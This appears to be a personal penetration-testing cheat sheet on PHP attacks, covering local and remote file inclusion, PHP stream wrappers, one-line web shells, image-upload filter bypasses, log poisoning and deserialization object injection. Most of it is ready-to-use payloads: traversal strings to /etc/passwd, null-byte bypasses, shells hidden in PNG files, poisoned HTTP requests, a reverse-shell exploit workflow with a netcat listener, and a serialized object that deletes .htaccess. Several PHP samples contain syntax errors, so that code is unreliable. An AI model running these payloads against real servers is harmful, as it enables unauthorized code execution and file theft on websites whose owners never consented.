PHP Vulnerabilities:(LFI/RFI/SHELL/WRAPPERS/CODE INJECTION/Deserialization)
===================
Basics:
	Directory Traversal vs File Inclusion:
		In Directory Traversal, we see the files
			Note: Directory Traversal is covered in another sheet 
		In File Inclusion, files get executed
PHP Basics:
	Understanding Backend Code for File Inclusion:
		Syntax:
			Function(Method[variable]):
		Examples:
			include($_GET['page']);
			include($_COOKIE['lang']);
		Functions for File Inclusions:(it executes command)
			include():
				include() also executes any PHP code in the included file on the server side.
			require():
				require() is similar to include() but' When a file is included with the include() and PHP cannot find it or load it properly, then the include() generates a warning but the script continues to execute!
			require_once():
				require_once() is used to access data of another page into our page but only once.The only difference between require and require_once is that, if it is found that the file has already been included in the page, then the calling script is going to ignore further inclusions.
		Methods:(it takes command from user to pass to system)
			It takes command from user to pass to system
			$_GET[var] => GET verb
			$_POST[var] => POST verb
			$_REQUEST[var] => both POST and GET
			$_COOKIE[var] => cookie field
	Understanding PHP Shells:
		Syntax:
			<?php <echo*> <function<method>>; ?>
		Examples:	
			<?php echo shell_exec($_REQUEST["cmd"]);?>
			<?php system($_REQUEST["cmd"]);?>
		Function:
			1.shell_exec() 	
			2.system()
			3.passthru()
		Method:
			$_GET[var] => GET verb
			$_POST[var] => POST verb
			$_REQUEST[var] => both POST and GET
			$_COOKIE[var] => cookie field
		filegetcontents()
	PHP Wrappers:
		RFI:
			?s=http://ip/file
				used to access file via HTTP 
			?s=ftp://ip/file
				used to access file via FTP
			?s=data://
		LFI:
			?s=php://filter/convert.base64-encode/resource=abcd.php
				it is mostly used in LFI, as if we want to see a code of a .php file hosted on victim, we wouldnt be able to see it normally as php gets executed automatically.
				it will give a base64 encoded string of content of 'abcd.php'
			?s=php://filter/read=string.rot13/resource=abcd.php
			?s=php://filter/convert.iconv.utf-8.utf-16/resource=file.php
			?s=file:// => Accessing local filesystem
		zlib:// => Compression Streams
		data:// => Data (RFC 2397)
		glob:// => Find pathnames matching pattern
		ssh2:// => Secure Shell 2
		rar:// => RAR
		ogg:// => Audio streams
		phar:// => deserialization
		expect:// => Process Interaction Streams
			?s=expect://ls
LFI:
	we see files hosted on server and also execute them.
	to confirm LFI:
		?file=<payload>
		payload:
			meaning of syntax:
				../ => go back one directory
				./ => stay in same directory
				/ => ignored
				by default, we apply atleast 3 levels directories
					reason:
						webite directory => /vr/www/html
						so, to get out of it we use ../../../
			../../../etc/hosts
			../../.././././././etc/hosts 
			../../../../../../../../etc/hosts
				we added a lot ../ and had same results as once we reach root directory, "../" has no effect.
			../../..///////etc/hosts
			Note:
				Linux Server => we use /etc/hosts as this file is visible to everyone
				Windows Server => C:\boot.ini
		how does it work(code):
			$file = $_GET['page'];
			require($file);
	Filter Evasion:
		Appending .php after filename:
			$file = $_GET['page'];
			require($file . ".php"); # it will add .php after every file
		Bypass-1:(works in PHP version < 5.3)
			%00 => null byte #after a null byte nothing gets executed
			?file=/etc/passwd%00
			?file=/etc/passwd%00.html
		Bypass-2:	
			By using a '?' (question mark)
			file=/etc/passwd?
			.php gets interpreted as a parameter and therefore excluded.
		Bypass-3:
			/ can be written as %2F (F => captial)
			../ => ..%2F
	LFI via phpinfo.php:(HTB:Poison)
		phpinfo.php is the config file for PHP based WebApps
		if "file_uploads:on", then phpinfo.php is vuln to LFI
			it allows us to upload a temp file to server, however we dont know where that file will be uploaded and under what name it will be. so, instead of making a file, we use a prebuilt exploit:
				github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py
					edit it as follows:
						1.PAYLOAD = """ %s \r 
						--paste code of php-reverse-shell by petestmonkey--
						2.LFIREQ = """ GET /abcd.php?efgh=%s
							remove %00%00 from front of %s
						3. [tmp_name] =&gt
					./explot.py vitcim_ip 80 <no of threads>
						no of threads = 100
					nc -nvlp 4444 => we get a shell
RFI:
	It has 2 requirements:
		It should have the same Functions and Methods as of LFI
		In /etc/php5/cgi/php.ini
			"allow_url_fopen":"on"
			"allow_url_include":"on"
	Here, we host a malicious .php file on our server and include it on victim's site or vulnerable page and get shell
		?file=http://my_ip/file
		?file=ftp://my_ip/file
File uploads:(uploading php shell as file)
	PHP code injection in PNG-1:
		echo '<?php' >> x.png
		echo 'echo shell_exec($_GET['cmd']);' >> x.png
		echo '?>' >> x.png
		rename to x.php.png
	PHP code injection in PNG-2:
		you might have to append the first hundred line of a png/jpeg file to a php reverse shell payload, so as to change its signature from a php file to a png file.
			head -n100 image.png > payload.png
			msfvenom_payload.php >> payload.png
	exiftool:	
		we can also use “exiftool” as well to append a comment or so to bypass the verification .
			exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' payload.png
PHP Code Injection:
	Log Poisoning:
		requirements => able to read log files(success.log/error.log)
		Inserting php-code into the log file:
			1.we add code into error-log by making request to a page that doesn't exists
				nc 192.168.1.102 80
				GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
				Host: 192.168.1.102
				Connection: close
			2.in referer header:
				GET / HTTP/1.1
				Referer: <? passthru($_GET[cmd]) ?>
				Host: 192.168.1.159
				Connection: close
		page=/var/log/apache2/access.log&cmd=id
	Code Injection in /proc/self/environ:

		https://www.exploit-db.com/papers/12992
PHP Deserialization and Object Injection:
	PHP Classes and Objects:
		<? php
			class user
			{
				public $var = 'hi'
				public function func($age)
				{
					echo $this->var.' i am '.$this->age.' years old'
				}
				
			}
			$obj = new user();
			$obj->age = 20;
			$obj->func();
		?>
	Magic Functions:
		these are those functions which exist by deafult and can be edited by user, these functions are associated with Objects. Every object has its own set of Magic Functions.
		__construct => constructs an object, it is invoked when an object is created
		__destruct => destructs an object, it is invoked after the last statement of a particular object
		__tostring => it is invoked when an object is used as a string, example: 'echo $obj'
		__sleep => it is invoked when an object is serialized, i.e. when 'serialize' function is used
		__wakeup => it is invoked when an object is unserialized, i.e. when 'unserialize' function is used
	serialize and unserialize:
		serialize => in-built function used to serialize an object.
		unserialize => in-built function used to unserialize an object.
		Example of serialized object:
			o:4:"user":2:{s:8:"username";S:4:"jhon";s:3:"age";n:20;}
			object:length_of_class_name:class_name:variables_in_class:details
			o => object
			s => string
			b => boolean
			n => number
	serialization:
		<?php
			class user
			{
				public $age = 0;
				public $name = '';
				public function PrintData()
				{
					echo $this->name.$this->age;
				}
				public function __construct()
				{
					echo 'constructing <br />';
				}
				public function __destruct()
				{
					echo 'destructing <br />';
				}
				public function __sleep();
				{
					echo 'serializing <br />';
				}
			}
			$obj = new user();
			$obj->age = 20;
			$obj->name = 'jhon';
			$obj->PrintData(); //output => jhon20
			echo serialize($obj) //give serialized object
		?>
		OUTPUT:
			constructing
			jhon20
			serializing
			destructing
	Unserialization:
		<?php
			class user
			{
				public $age = 0;
				public $name = '';
				public function PrintData()
				{
					echo $this->name.$this->age;
				}
				public function __construct()
				{
					echo 'constructing <br />';
				}
				public function __destruct()
				{
					echo 'destructing <br />';
				}
				public function __wakeup();
				{
					echo 'deserializing <br />';		
			}
			$obj = unserialize('serialized_string');
			$obj->PrintData(); //output => jhon20
		?>	
		OUTPUT:
			constructing
			deserializing
			jhon20
			destructing
	vulnerability:
		logfile.php
			<?php
				class logfile
				{
					public $filename = 'error.log';
					public function logdata($text)
					{
						file_put_contents($this->filename,$text,FILE_APPEND);
					}
					public  function __destruct()
					{
						unlink(dirname(__FILE__).'/'.$this->filename);
					}
				}
			?>
		script.php
			<?php
				include 'logfile.php';
				//some code
				class user
				{
					public $age=0;
					public function PrintData()
					{
						echo $this->age;
					}
				}
				//some code
				$usr = unserialize($_GET['usr_serialized']);
			?>
			it wokred like:
				someting.com/script.php?usr_serialized=o:4:"user"........
		Now, if we try to pass a logfile object to parameter
			to get logfile object:
				<?php
					include 'logfile.php'
					$obj = new logfile();
					$obj->filename = '.htaccess';
					echo serialize($obj).'<br />';
				?>
				it will give serialized object of logfile object
		passing it in parameter:
			someting.com/script.php?usr_serialized=o:7:"logfile"........
				boom
